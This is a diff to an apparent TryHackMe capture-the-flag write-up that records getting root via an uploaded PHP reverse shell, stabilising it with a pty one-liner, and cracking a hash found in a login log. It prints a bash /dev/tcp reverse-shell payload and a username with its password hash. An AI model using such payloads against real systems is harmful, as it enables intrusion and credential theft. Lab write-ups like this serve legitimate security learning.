@@ -23,7 +23,7 @@ chmod +x /tmp/f
 /tmp/f
 ```
 
-![denied1](Screenshots/fw-Shell-denied)
+![denied1](Screenshots/fw-Shell-denied.png)
 
 I tried also:
 ```bash
@@ -53,6 +53,34 @@ Also it uploaded to /tmp, not /var/www/html/. So then I tried:
 "<?php exec("/bin/bash -c 'bash -i > /dev/tcp/$ip/$port 0>&1'");?>"
 ```
 
-![denied2]((Screenshots/fw-phpExecDenied)
+![denied2]((Screenshots/fw-phpExecDenied.png)
 
-Then tried putting the pentest monkey code into the execute php command 
+Then tried putting the pentest monkey code into the execute php command changed the I provided IP address of the Kali VM on THM to its inet IP not generic IP used in reverse shells. 
+
+![root-fw](Screenshots/fw-initial-root.png)
+
+And the flag
+
+![root-fw](Screenshots/fw-root-flag.png)
+
+Tried stablising with:
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+But it broke, tried again:
+
+![root-stab](Screenshots/fw-shell-stab-broke.png)
+
+
+
+![root-log](Screenshots/fw-find-logs.png)
+
+Why would you have login.log
+
+HumphreyW:1c13639dba96c7b53d26f7d00956a364
+
+![cracked](Screenshots/fw-humpreyw-cracked.png)
+
+Note that if this was an actual Pentest that permission to use third party Hashcracking would have to be within scope due to handing over confidential data to an outside source in the form of a hash. If that third was compromised morally or in terms of their security then traffic data could be linked to the hash.
+
